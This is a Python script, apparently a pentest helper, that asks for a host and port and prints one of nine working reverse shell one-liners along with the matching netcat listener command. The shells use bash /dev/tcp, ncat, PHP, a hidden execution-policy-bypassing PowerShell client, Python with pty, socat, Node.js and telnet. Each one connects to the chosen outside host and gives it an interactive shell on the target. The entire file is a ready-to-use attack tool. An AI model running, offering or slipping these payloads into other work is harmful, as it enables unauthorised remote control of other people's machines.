host = input("Host Address: ")
port = input("Listening Port: ")


reverse_bash_tcp = f"bash -i >& /dev/tcp/{host}/{port} 0>&1"
reverse_ncat = f"ncat {host} {port} -e /bin/bash"
reverse_php = f"php -r '$sock=fsockopen('{host}',{port});exec('/bin/sh -i <&3 >&3 2>&3');'"
reverse_powershell = 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("' + host + '",' + port + ');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
reverse_python3 = f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{host}',{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('sh')'"
reverse_python = f"python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{host}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')'"
reverse_socat = f"socat tcp:{host}:{port} exec:'bash -i' ,pty,stderr,setsid,sigint,sane &"
reverse_nodejs = f"require('child_process').exec('nc -e sh {host} {port}')"
reverse_telnet = f"TF=$(mktemp -u);mkfifo $TF && telnet {host} {port} 0<$TF | sh 1>$TF"


def print_selected(x):
    print(f"\n[+]Local Command:")
    print(f"nc -nvlp {port}")
    print("\n[+]Target Command:")
    if x == 1:
        print(reverse_bash_tcp)
    elif x == 2:
        print(reverse_ncat)
    elif x == 3:
        print(reverse_php)
    elif x == 4:
        print(reverse_powershell)
    elif x == 5:
        print(reverse_python3)
    elif x == 6:
        print(reverse_python)
    elif x == 7:
        print(reverse_socat)
    elif x == 8:
        print(reverse_nodejs)
    elif x == 9:
        print(reverse_telnet)
    else:
        print("\nerror[!] Choose a number between 1-9")
        print_selected(int(input("\n[1-9] Selection: ")))
    print_selected(int(input("\n\n[1-9] Select another: ")))


def show_reverse_shells():
    print("""
    ╔═════════════════╦════╗
    ║ Reverse shells  ║ NR ║
    ╠═════════════════╬════╣
    ║   Bash TCP      ║ 1  ║
    ╠═════════════════╬════╣
    ║   Ncat          ║ 2  ║
    ╠═════════════════╬════╣
    ║   PHP           ║ 3  ║ 
    ╠═════════════════╬════╣
    ║   Powershell    ║ 4  ║
    ╠═════════════════╬════╣
    ║   Python3       ║ 5  ║
    ╠═════════════════╬════╣
    ║   Python        ║ 6  ║
    ╠═════════════════╬════╣
    ║   Socat         ║ 7  ║
    ╠═════════════════╬════╣
    ║   Node.js       ║ 8  ║
    ╠═════════════════╬════╣
    ║   Telnet        ║ 9  ║
    ╚═════════════════╩════╝ """)

    print_selected(int(input("\n[1-9] Selection: ")))


show_reverse_shells()
